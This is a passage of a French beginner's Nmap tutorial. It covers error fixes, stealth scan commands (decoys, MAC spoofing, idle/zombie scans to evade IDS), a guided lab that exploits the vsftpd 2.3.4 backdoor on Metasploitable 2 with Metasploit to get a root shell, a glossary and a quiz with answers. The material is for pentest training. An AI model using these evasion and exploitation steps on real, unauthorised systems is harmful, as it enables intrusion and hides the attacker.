**En clair, pour un débutant :** Nmap ne trouve pas l'adresse IP correspondant au nom que vous avez donné (comme ne pas trouver le numéro de téléphone pour un nom dans l'annuaire). Vérifiez si vous avez bien écrit le nom ou s'il y a un problème avec votre connexion internet ou DNS.

### `QUITTING!` (suivi d'une raison)

**Cause :** Nmap s'arrête prématurément pour diverses raisons. Les plus courantes sont :
- **Permissions insuffisantes :** Certains scans (comme `-sS`, `-O`, `-sI`) nécessitent les privilèges root/administrateur.
- **Interface réseau invalide :** L'interface spécifiée avec `-e` n'existe pas ou n'est pas configurée.
- **Erreurs critiques :** Problèmes réseau graves, manque de mémoire, etc.

**Solution :**
- Pour les problèmes de permissions : exécutez Nmap avec `sudo` (Linux/macOS) ou en tant qu'administrateur (Windows).
- Pour les problèmes d'interface : vérifiez le nom de votre interface réseau (`ip addr` ou `ifconfig` sur Linux, `ipconfig` sur Windows) et utilisez l'option `-e` correctement si nécessaire.
- Lisez attentivement le message d'erreur qui précède `QUITTING!` pour identifier la cause spécifique.

**En clair, pour un débutant :** Nmap s'arrête brusquement. Souvent, c'est parce que vous n'avez pas les droits nécessaires (essayez avec `sudo`) ou qu'il y a un problème avec votre connexion réseau. Lisez le message juste avant "QUITTING!" pour comprendre pourquoi.

### `TCP/IP fingerprinting failed.`

**Cause :** Nmap n'a pas pu collecter suffisamment d'informations pour identifier le système d'exploitation de la cible avec l'option `-O`. Cela peut arriver si la cible est derrière un pare-feu strict, si le réseau est peu fiable, ou si la cible a un comportement réseau inhabituel.

**Solution :**
- Assurez-vous d'exécuter Nmap avec les privilèges root (`sudo`).
- Essayez d'augmenter la verbosité (`-v` ou `-vv`) pour plus de détails.
- Essayez l'option `--osscan-guess` ou `--fuzzy` pour forcer Nmap à faire une estimation.
- Utilisez d'autres méthodes pour identifier l'OS (bannières de service avec `-sV`, scripts NSE).

**En clair, pour un débutant :** Nmap n'a pas réussi à deviner quel système d'exploitation (Windows, Linux...) utilise la cible. C'est comme ne pas pouvoir reconnaître une voiture juste en écoutant le bruit du moteur. Essayez d'autres options pour obtenir plus d'indices.

### `NSE: Script scanning timed out.`

**Cause :** Un ou plusieurs scripts NSE ont pris trop de temps à s'exécuter et ont été interrompus par Nmap pour éviter de bloquer le scan.

**Solution :**
- Augmentez le délai d'attente pour les scripts avec `--script-timeout`. Par exemple, `--script-timeout 10m` pour 10 minutes.
- Exécutez moins de scripts à la fois.
- Utilisez une temporisation plus lente (`-T2` ou `-T1`).
- Identifiez le script problématique (en utilisant `-d` pour le débogage) et exécutez-le séparément ou analysez pourquoi il est lent.

```bash
# Augmenter le timeout des scripts
sudo nmap --script vuln --script-timeout 10m 192.168.1.1
```

**En clair, pour un débutant :** Les mini-programmes (scripts NSE) que Nmap utilise ont mis trop de temps à répondre. Nmap les a arrêtés pour ne pas rester bloqué. Vous pouvez leur donner plus de temps avec `--script-timeout`.

### `Idle scan requires root privileges.`

**Cause :** Le scan Idle (`-sI`) nécessite la capacité de forger des paquets bruts, ce qui requiert les privilèges root/administrateur.

**Solution :** Exécutez Nmap avec `sudo` (Linux/macOS) ou en tant qu'administrateur (Windows).

```bash
sudo nmap -sI zombie_ip target_ip
```

**En clair, pour un débutant :** Pour faire le scan "zombie" (`-sI`), Nmap a besoin de droits spéciaux (root/admin). Utilisez `sudo` avant votre commande.

### `Idle scan zombie 192.168.1.5 port 80 is not responding.` ou `ipidseq Failed.`

**Cause :** L'hôte choisi comme zombie pour le scan Idle (`-sI`) ne convient pas. Soit il ne répond pas, soit son IPID n'est pas prévisible (il n'incrémente pas de manière fiable), soit un pare-feu bloque les paquets nécessaires.

**Solution :**
- Trouvez un autre hôte zombie. Utilisez `nmap --script ipidseq <potential_zombie_ip>` pour tester si un hôte est un bon candidat (recherchez "Incremental" dans la sortie).
- Assurez-vous que le port spécifié sur le zombie est ouvert ou fermé (pas filtré).
- Vérifiez qu'il n'y a pas de pare-feu entre vous, le zombie et la cible qui interfère avec le scan.

**En clair, pour un débutant :** L'ordinateur "zombie" que vous avez choisi pour le scan `-sI` ne fonctionne pas bien pour cette technique. Il faut en trouver un autre qui soit plus "coopératif" (avec un IPID prévisible).

### `dnet: Failed to open device eth0` ou `Error opening device ...`

**Cause :** Nmap ne peut pas accéder à l'interface réseau spécifiée (ou à l'interface par défaut). Cela est généralement dû à un manque de permissions.

**Solution :** Exécutez Nmap avec `sudo` ou en tant qu'administrateur. Si vous utilisez `-e` pour spécifier une interface, assurez-vous que le nom est correct.

**En clair, pour un débutant :** Nmap n'arrive pas à utiliser votre carte réseau (comme `eth0`). C'est presque toujours un problème de permissions. Utilisez `sudo`.

## 12. ⚡ Quick Ops

Voici 12 commandes Nmap prêtes à l'emploi pour des situations courantes, avec explications.

1.  **Contexte :** Découverte rapide des hôtes actifs sur votre réseau local (sans scanner les ports).
    **Ligne :** `nmap -sn 192.168.1.0/24`
    **Résultat :** Liste des adresses IP qui ont répondu au ping.
    **En clair, pour un débutant :** Trouve rapidement quels appareils sont allumés sur votre réseau local (comme un appel rapide pour voir qui répond).

2.  **Contexte :** Scan des ports TCP les plus courants (top 1000) sur un serveur web distant.
    **Ligne :** `sudo nmap -sS scanme.nmap.org`
    **Résultat :** Liste des ports TCP ouverts parmi les 1000 plus fréquents, avec leur état (open, closed, filtered).
    **En clair, pour un débutant :** Vérifie les 1000 portes TCP les plus utilisées sur un serveur distant pour voir lesquelles sont ouvertes.

3.  **Contexte :** Scan complet de tous les ports TCP (1-65535) avec détection de version des services et OS, sur une cible spécifique.
    **Ligne :** `sudo nmap -sS -sV -O -p- -T4 10.10.10.5`
    **Résultat :** Rapport détaillé des ports ouverts, des versions des logiciels qui y tournent, et une estimation de l'OS.
    **En clair, pour un débutant :** Examine toutes les portes TCP d'une machine, identifie les logiciels derrière et essaie de deviner son système (Windows, Linux...). C'est un scan très complet mais plus long.

4.  **Contexte :** Scan des ports UDP les plus courants (top 100) sur une machine locale.
    **Ligne :** `sudo nmap -sU --top-ports 100 192.168.1.1`
    **Résultat :** Liste des 100 ports UDP les plus courants et leur état (souvent `open|filtered`).
    **En clair, pour un débutant :** Vérifie les 100 portes UDP les plus importantes sur une machine locale (les scans UDP sont plus lents et moins fiables que TCP).

5.  **Contexte :** Recherche de vulnérabilités web courantes sur un serveur HTTP/HTTPS.
    **Ligne :** `nmap --script http-vuln* -p 80,443 10.10.10.20`
    **Résultat :** Liste des vulnérabilités web potentielles détectées par les scripts NSE correspondants.
    **En clair, pour un débutant :** Lance des tests spécifiques pour trouver des failles de sécurité connues sur un site web (ports 80 et 443).

6.  **Contexte :** Scan discret pour identifier les serveurs web (ports 80, 443) sur un réseau, en évitant la détection IDS simple.
    **Ligne :** `sudo nmap -sS -Pn -T2 -p 80,443 --data-length 30 192.168.10.0/24`
    **Résultat :** Liste des hôtes avec les ports 80 ou 443 ouverts, avec un scan plus lent et des paquets légèrement modifiés pour être discret.
    **En clair, pour un débutant :** Cherche les serveurs web sur un réseau, mais plus lentement (`-T2`) et en modifiant un peu les paquets (`--data-length`) pour essayer de ne pas déclencher d'alarmes.

7.  **Contexte :** Scan agressif (`-A`) d'une seule cible pour obtenir un maximum d'informations rapidement (OS, versions, scripts par défaut, traceroute).
    **Ligne :** `sudo nmap -A 10.10.10.30`
    **Résultat :** Rapport très détaillé incluant OS, versions, résultats des scripts par défaut et chemin réseau.
    **En clair, pour un débutant :** Lance un scan "tout-en-un" rapide mais bruyant pour obtenir le plus d'infos possible sur une machine (OS, logiciels, etc.).

8.  **Contexte :** Scan d'un réseau local en usurpant une adresse MAC aléatoire pour masquer votre machine.
    **Ligne :** `sudo nmap -sS --spoof-mac 0 192.168.1.0/24`
    **Résultat :** Scan SYN standard, mais les paquets semblent provenir d'une adresse MAC inexistante.
    **En clair, pour un débutant :** Scanne le réseau local en faisant croire que les paquets viennent d'une autre carte réseau (MAC) pour cacher votre vraie machine. Ne fonctionne que sur le réseau local.

9.  **Contexte :** Scan SYN utilisant des leurres (decoys) pour masquer votre adresse IP réelle parmi d'autres adresses (dont une inexistante et google.com).
    **Ligne :** `sudo nmap -sS -D 10.0.0.1,ME,google.com,RND 192.168.1.50`
    **Résultat :** La cible voit des paquets SYN venant de 10.0.0.1, de votre IP (ME), de google.com et d'une IP aléatoire (RND), rendant difficile l'identification de la source réelle.
    **En clair, pour un débutant :** Scanne la cible en envoyant aussi des faux paquets depuis d'autres adresses (leurres) pour brouiller les pistes et cacher votre vraie adresse IP.

10. **Contexte :** Scan Idle extrêmement furtif en utilisant un hôte "zombie" (192.168.1.5) pour scanner les ports web d'une cible (192.168.1.10).
    **Ligne :** `sudo nmap -sI 192.168.1.5:80 -Pn -p 80,443 192.168.1.10`
    **Résultat :** Scan des ports 80 et 443 de la cible, mais le trafic semble provenir uniquement du zombie, rendant votre machine invisible pour la cible.
    **En clair, pour un débutant :** Utilise un autre ordinateur (le zombie) pour faire le scan à votre place. C'est très discret car la cible ne voit jamais votre adresse IP.

11. **Contexte :** Scan de tous les ports TCP, détection de version, exécution des scripts par défaut, et sauvegarde des résultats dans tous les formats (Normal, XML, Grepable).
    **Ligne :** `sudo nmap -sS -sV -sC -p- -T4 10.10.10.40 -oA scan_complet_cible40`
    **Résultat :** Scan détaillé et création de 3 fichiers : `scan_complet_cible40.nmap`, `scan_complet_cible40.xml`, `scan_complet_cible40.gnmap`.
    **En clair, pour un débutant :** Fait un scan très complet et enregistre les résultats dans 3 fichiers différents (pour lecture humaine, pour les programmes, et pour filtrer facilement).

12. **Contexte :** Vérifier rapidement si le port SMB (445) est ouvert sur une liste de machines Windows potentielles lues depuis un fichier.
    **Ligne :** `nmap -p 445 -T4 -iL liste_windows.txt -oG resultat_smb.txt`
    **Résultat :** Scan rapide du port 445 sur les machines listées dans `liste_windows.txt`, avec sortie facile à filtrer dans `resultat_smb.txt`.
    **En clair, pour un débutant :** Vérifie si le partage de fichiers Windows (port 445) est ouvert sur une liste de machines (lue depuis un fichier) et enregistre les résultats de manière concise.

## 13. Mini-lab guidé : De Nmap à Metasploit (VSFTPD)

Ce mini-lab vous guide à travers un scénario classique de pentest : utiliser Nmap pour cartographier un réseau, identifier une vulnérabilité, et l'exploiter avec Metasploit. Durée estimée : 60 minutes.

**Prérequis :**
- Une machine attaquante avec Nmap et Metasploit installés (Kali Linux, Parrot OS, ou autre distribution de pentest).
- Une machine cible vulnérable, comme Metasploitable 2 (disponible en téléchargement). Assurez-vous que les deux machines sont sur le même réseau (par exemple, en utilisant un réseau NAT ou Host-Only dans VirtualBox/VMware).
- **IMPORTANT :** N'effectuez ce lab que sur des machines virtuelles que vous contrôlez. Ne scannez jamais de réseaux ou de machines sans autorisation explicite.

**Scénario :** Vous êtes un pentester chargé d'évaluer la sécurité d'un segment de réseau interne (simulé par votre machine Metasploitable 2). Votre objectif est de trouver une machine vulnérable et d'obtenir un accès.

**Réseau cible (exemple) :** Supposons que votre machine Metasploitable 2 ait l'adresse IP `10.10.10.100` et que votre machine attaquante soit sur le même réseau `10.10.10.0/24`.

### Étape 1 : Cartographie du réseau avec Nmap (15 min)

Objectif : Identifier les hôtes actifs et les services ouverts sur le réseau cible.

```bash
# Scan SYN rapide (-sS), détection de version (-sV), scripts par défaut (-sC)
# Scan rapide (-T4), sur tout le réseau (/24), sauvegarde en XML (-oX)
sudo nmap -sS -sV -sC -T4 10.10.10.0/24 -oX lab_scan.xml
```

Analysez la sortie. Recherchez les hôtes actifs et les services intéressants (FTP, SSH, Web, SMB, etc.). Notez particulièrement les versions des services.

### Étape 2 : Analyse des résultats et identification de VSFTPD (10 min)

Examinez le fichier `lab_scan.xml` ou la sortie console. Vous devriez trouver un hôte (probablement `10.10.10.100`) avec le port 21 ouvert et le service `vsftpd 2.3.4`.

```
# Extrait attendu de la sortie Nmap
Host: 10.10.10.100
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
...
```

La version `2.3.4` de VSFTPD est connue pour contenir une backdoor.

### Étape 3 : Importation dans Metasploit (10 min)

Objectif : Utiliser les résultats de Nmap dans Metasploit pour faciliter l'exploitation.

```bash
# Démarrer PostgreSQL si nécessaire
sudo systemctl start postgresql

# Lancer Metasploit
sudo msfconsole

# Vérifier la connexion à la base de données
msf6 > db_status
[*] postgresql connected to msf

# Importer le scan Nmap
msf6 > db_import lab_scan.xml
[*] Importing 'nmap' data
[*] Import: Parsing XML data...
[*] Import: Successfully imported /path/to/lab_scan.xml

# Vérifier les hôtes importés
msf6 > hosts

# Vérifier les services importés (filtrer sur le port 21)
msf6 > services -p 21
```

### Étape 4 : Exploitation de VSFTPD avec Metasploit (15 min)

Objectif : Utiliser l'exploit Metasploit pour la backdoor VSFTPD 2.3.4.

```bash
# Rechercher l'exploit pour vsftpd 2.3.4
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03     excellent Yes    VSFTPD v2.3.4 Backdoor Command Execution


# Utiliser l'exploit
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# Afficher les options requises
msf6 > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOSTS                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT  21               yes       The target port (TCP)

# Définir l'hôte cible (RHOSTS)
msf6 > set RHOSTS 10.10.10.100
RHOSTS => 10.10.10.100

# Lancer l'exploit
msf6 > exploit
```

### Étape 5 : Vérification de l'accès (10 min)

Si l'exploit réussit, vous devriez obtenir une session shell sur la machine cible.

```bash
[*] 10.10.10.100:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.100:21 - USER: 331 Please specify the password.
[*] 10.10.10.100:21 - Exploit completed, but no session was created.
[+] 10.10.10.100:21 - Appears to be backdoored (vsFTPd 2.3.4).
[*] Found shell.
[*] Command shell session 1 opened (10.10.10.X:4444 -> 10.10.10.100:6200) at 2025-05-29 23:20:00 +0000

# Vous êtes maintenant dans le shell de la cible
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

Félicitations ! Vous avez utilisé Nmap pour trouver une vulnérabilité et Metasploit pour l'exploiter.

**En clair, pour un débutant :** Ce lab vous montre comment utiliser Nmap pour trouver une faille sur une machine d'entraînement (Metasploitable 2), puis comment utiliser un autre outil (Metasploit) pour exploiter cette faille et prendre le contrôle de la machine. C'est un exemple concret du travail d'un pentester.

### <details><summary>⚠️ Solution Spoiler</summary>

**Environnement :**
- Machine Attaquante (Kali/Parrot) : IP 10.10.10.X
- Machine Cible (Metasploitable 2) : IP 10.10.10.100

**Commandes détaillées :**

1.  **Scan Nmap :**
    ```bash
    sudo nmap -sS -sV -sC -T4 10.10.10.0/24 -oX lab_scan.xml
    ```
    *Trouvera `10.10.10.100` avec le port 21/tcp ouvert, service `vsftpd 2.3.4`.*

2.  **Lancement Metasploit et Import :**
    ```bash
    sudo msfconsole
    msf6 > db_import lab_scan.xml
    msf6 > hosts
    msf6 > services -p 21 -c name,info
    ```
    *Confirmera la présence de vsftpd 2.3.4 sur `10.10.10.100`.*

3.  **Exploitation :**
    ```bash
    msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
    msf6 > set RHOSTS 10.10.10.100
    msf6 > exploit
    ```

4.  **Vérification :**
    ```bash
    # Une fois la session ouverte
    whoami
    # Devrait retourner 'root'
    ```

</details>



## 14. Glossaire local

Voici une définition simplifiée de 20 termes essentiels que vous rencontrerez en utilisant Nmap et en étudiant la sécurité réseau :

1.  **Nmap (Network Mapper) :** Outil principal pour scanner les réseaux, découvrir les machines connectées et les services qu'elles proposent.
    *En clair :* Le "radar" pour voir ce qui se passe sur un réseau.

2.  **Port :** Porte numérique sur un ordinateur permettant aux programmes de communiquer sur un réseau. Chaque service (web, mail, etc.) utilise un numéro de port spécifique (ex: 80 pour le web).
    *En clair :* Une porte d'entrée/sortie pour les données sur un ordinateur.

3.  **TCP (Transmission Control Protocol) :** Protocole réseau fiable qui assure que les données arrivent correctement et dans l'ordre (utilisé pour le web, mail, SSH...). Il établit une connexion avant d'envoyer les données.
    *En clair :* Comme un appel téléphonique, on établit la connexion avant de parler.

4.  **UDP (User Datagram Protocol) :** Protocole réseau rapide mais moins fiable que TCP. Il n'établit pas de connexion et n'assure pas l'arrivée des données (utilisé pour le streaming, DNS, jeux en ligne).
    *En clair :* Comme envoyer une carte postale, rapide mais sans garantie de réception.

5.  **SYN (Synchronize) :** Premier paquet envoyé pour démarrer une connexion TCP.
    *En clair :* Le "Bonjour, je voudrais me connecter" d'une connexion TCP.

6.  **ACK (Acknowledge) :** Paquet envoyé pour confirmer la réception d'un autre paquet TCP.
    *En clair :* Le "Bien reçu" d'une connexion TCP.

7.  **RST (Reset) :** Paquet envoyé pour fermer immédiatement une connexion TCP ou indiquer qu'un port est fermé.
    *En clair :* Le "Stop, on arrête tout" ou "Cette porte est fermée" d'une connexion TCP.

8.  **FIN (Finish) :** Paquet envoyé pour demander la fermeture normale d'une connexion TCP.
    *En clair :* Le "Au revoir, j'ai fini" d'une connexion TCP.

9.  **Scan de ports :** Action de tester différents ports sur une machine cible pour voir lesquels sont ouverts, fermés ou filtrés (bloqués par un pare-feu).
    *En clair :* Essayer de frapper à toutes les portes pour voir lesquelles s'ouvrent.

10. **Détection de version (-sV) :** Option Nmap qui tente d'identifier le nom et la version exacte du logiciel (service) qui écoute sur un port ouvert.
    *En clair :* Regarder à travers la porte ouverte pour voir quel programme est derrière.

11. **Détection d'OS (-O) :** Option Nmap qui tente de deviner le système d'exploitation (Windows, Linux, macOS...) de la machine cible en analysant ses réponses réseau.
    *En clair :* Essayer de deviner la marque et le modèle de la "maison" (ordinateur) en observant comment elle réagit.

12. **NSE (Nmap Scripting Engine) :** Fonctionnalité de Nmap permettant d'exécuter des petits programmes (scripts) pour automatiser des tâches (chercher des failles, collecter plus d'infos...).
    *En clair :* La boîte à outils d'extensions de Nmap.

13. **Script NSE :** Un programme écrit en langage Lua que le NSE peut exécuter pour effectuer une tâche spécifique pendant un scan.
    *En clair :* Un outil spécifique dans la boîte à outils NSE.

14. **OPSEC (Operations Security) :** Ensemble des précautions prises par un attaquant (ou pentester) pour éviter d'être détecté pendant ses opérations.
    *En clair :* Les techniques pour rester discret et ne pas se faire repérer.

15. **Évasion :** Techniques utilisées pour contourner les systèmes de sécurité comme les pare-feu ou les IDS (Systèmes de Détection d'Intrusion).
    *En clair :* Les méthodes pour passer sous le radar des gardes de sécurité du réseau.

16. **Decoy (Leurre) :** Technique Nmap consistant à envoyer des paquets depuis de fausses adresses IP en plus de la vraie, pour noyer l'adresse de l'attaquant parmi d'autres.
    *En clair :* Créer une diversion en faisant croire que l'attaque vient de plusieurs endroits.

17. **Idle Scan (-sI) :** Technique de scan Nmap très furtive qui utilise une machine intermédiaire (zombie) pour scanner la cible. La cible ne voit jamais l'adresse IP de l'attaquant.
    *En clair :* Envoyer quelqu'un d'autre (le zombie) faire le scan à votre place pour rester anonyme.

18. **Zombie :** Machine inactive et avec un comportement réseau prévisible, utilisée comme relais dans un Idle Scan.
    *En clair :* L'intermédiaire utilisé dans le scan Idle.

19. **IPID (IP Identification) :** Numéro séquentiel dans l'en-tête des paquets IP. Son comportement prévisible sur certaines machines est la clé du fonctionnement de l'Idle Scan.
    *En clair :* Un compteur sur les paquets envoyés, utilisé par le scan Idle pour deviner l'état des ports.

20. **Metasploit :** Plateforme très populaire utilisée pour développer et exécuter des exploits contre des machines vulnérables. Souvent utilisée après Nmap pour passer à l'attaque.
    *En clair :* La "caisse à outils" pour exploiter les failles trouvées avec Nmap.


## 15. Quiz final

Testez vos connaissances sur Nmap avec ce quiz de 5 questions à choix multiples. Les réponses correctes sont indiquées à la fin.

### Question 1 : Types de scans

Quel type de scan Nmap est le plus discret et ne complète jamais la connexion TCP ?

A) TCP Connect scan (`-sT`)  
B) TCP SYN scan (`-sS`)  
C) TCP FIN scan (`-sF`)  
D) UDP scan (`-sU`)  

### Question 2 : Options essentielles

Quelle combinaison d'options Nmap permet d'obtenir le maximum d'informations sur une cible en une seule commande ?

A) `-sS -p-`  
B) `-sV -O`  
C) `-A`  
D) `-T5 -F`  

### Question 3 : NSE (Nmap Scripting Engine)

Quelle commande utiliseriez-vous pour exécuter tous les scripts NSE de la catégorie "vulnérabilités" sur un serveur web ?

A) `nmap --script vuln 192.168.1.1 -p 80,443`  
B) `nmap --script-category vuln 192.168.1.1`  
C) `nmap -sC 192.168.1.1 -p 80,443`  
D) `nmap --script-vuln 192.168.1.1 -p 80,443`  

### Question 4 : OPSEC et évasion

Quelle technique permet de scanner une cible sans jamais révéler votre adresse IP à celle-ci ?

A) Scan avec decoys (`-D`)  
B) Scan fragmenté (`-f`)  
C) Scan Idle/Zombie (`-sI`)  
D) Scan avec spoofing MAC (`--spoof-mac`)  

### Question 5 : Intégration offensive

Dans un workflow offensif typique, quelle est la séquence correcte d'utilisation des outils ?

A) Metasploit → Nmap → Searchsploit  
B) Nmap → Searchsploit → Metasploit  
C) Searchsploit → Nmap → Metasploit  
D) Nmap → Metasploit → Searchsploit  

---

### Corrigé du quiz

**Question 1 : B) TCP SYN scan (`-sS`)**  
Le scan SYN n'établit jamais de connexion complète. Il envoie un paquet SYN, reçoit un SYN/ACK si le port est ouvert, puis envoie un RST pour terminer immédiatement sans compléter le handshake TCP.

**Question 2 : C) `-A`**  
L'option `-A` (Agressif) combine plusieurs fonctionnalités : détection de version (`-sV`), détection d'OS (`-O`), scripts par défaut (`-sC`) et traceroute. C'est la commande la plus complète en une seule option.

**Question 3 : A) `nmap --script vuln 192.168.1.1 -p 80,443`**  
Cette commande exécute tous les scripts de la catégorie "vuln" (vulnérabilités) sur les ports 80 et 443 de la cible.

**Question 4 : C) Scan Idle/Zombie (`-sI`)**  
Le scan Idle/Zombie est le seul qui ne révèle jamais votre adresse IP à la cible. Il utilise une machine tierce (zombie) pour effectuer le scan, et la cible ne voit que l'adresse IP du zombie.

**Question 5 : B) Nmap → Searchsploit → Metasploit**  
Le workflow typique consiste à d'abord scanner avec Nmap pour identifier les services et versions, puis utiliser Searchsploit pour trouver des exploits correspondant à ces versions, et enfin utiliser Metasploit pour exploiter les vulnérabilités identifiées.
